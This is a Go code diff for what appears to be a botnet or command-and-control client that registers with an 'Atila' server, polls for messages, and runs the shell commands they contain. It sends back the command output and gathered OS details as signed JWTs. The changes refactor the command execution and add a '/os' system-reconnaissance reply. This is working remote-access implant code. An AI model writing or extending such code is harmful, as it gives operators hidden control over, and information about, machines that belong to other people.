@@ -7,8 +7,6 @@ import (
 	"errors"
 	"fmt"
 	"net/http"
-	"os/exec"
-	"strings"
 
 	"github.com/golang-jwt/jwt"
 )
@@ -37,6 +35,13 @@ type ReplyMessage struct {
 	ReplyTo string `json:"replyTo"` // Message ID.
 }
 
+// Corresponds to ReplyMessage.Content, keep in mind that this type needs to be
+// converted into string by making it into a JWT, prior to assigning it to ReplyMessage.Content
+type ReplyContent struct {
+	ShellOutput string    `json:"shellOutput"` // Output of executed shell code.
+	OsDetails   OsDetails `json:"osDetails"`   // Basic information about the system.
+}
+
 // IdentifyPayload is a structure corresponding to Atila's bot identification endpoint.
 type IdentifyPayload struct {
 	Id        string `json:"id"`        // UUID of the bot. (self-generated)
@@ -48,6 +53,34 @@ type IdentifyPayload struct {
 type MessageAck struct {
 	Id     string `json:"id"`
 	Status string `json:"status"`
+}
+
+// inboxReader is a loop of fetching and interpreting messages.
+// Returns true if the operation was successful, false if it didn't.
+func inboxReader(id string) bool {
+	messages := fetchMessages(id)
+
+	for _, message := range messages {
+		reply, err := interpretMessage(message)
+		if err != nil {
+			fmt.Println(err.Error())
+			continue
+		}
+
+		err = sendMessage(reply)
+		if err != nil {
+			fmt.Println(err.Error())
+			continue
+		}
+
+		err = messageAck(reply.ReplyTo)
+		if err != nil {
+			fmt.Println(err.Error())
+			continue
+		}
+	}
+
+	return true
 }
 
 // identify makes the bot known to the Atila server. Returns true if identification was successful.
@@ -93,34 +126,6 @@ func identify(id string, publicKey *rsa.PublicKey) bool {
 	if response.StatusCode != 200 {
 		fmt.Println("Identification failed with status code: " + fmt.Sprint(response.StatusCode))
 		return false
-	}
-
-	return true
-}
-
-// inboxReader is a loop of fetching and interpreting messages.
-// Returns true if the operation was successful, false if it didn't.
-func inboxReader(id string) bool {
-	messages := fetchMessages(id)
-
-	for _, message := range messages {
-		reply, err := interpretMessage(message)
-		if err != nil {
-			fmt.Println(err.Error())
-			continue
-		}
-
-		err = sendMessage(reply)
-		if err != nil {
-			fmt.Println(err.Error())
-			continue
-		}
-
-		err = messageAck(reply.ReplyTo)
-		if err != nil {
-			fmt.Println(err.Error())
-			continue
-		}
 	}
 
 	return true
@@ -226,18 +231,21 @@ func interpretMessage(message Message) (Message, error) {
 	}
 
 	// Execute content.
-	cmd := exec.Command(strings.TrimSuffix(content.Shell, "\n"))
-	var out bytes.Buffer
-	cmd.Stdout = &out
+	replyContent := ReplyContent{}
 
-	err = cmd.Run()
-	if err != nil {
-		fmt.Println(err.Error())
-		return reply, err
+	if content.Shell == "/os" {
+		replyContent.OsDetails = osDetails()
+	} else {
+		replyContent.ShellOutput, err = runTerminal(content.Shell)
+		if err != nil {
+			fmt.Println(err.Error())
+			return reply, err
+		}
 	}
 
 	replyToken := jwt.NewWithClaims(jwt.SigningMethodRS512, jwt.MapClaims{
-		"shell-output": out.String(),
+		"shellOutput": replyContent.ShellOutput,
+		"osDetails":   replyContent.OsDetails,
 	})
 
 	replyTokenString, err := replyToken.SignedString(privateIdentificationKey)
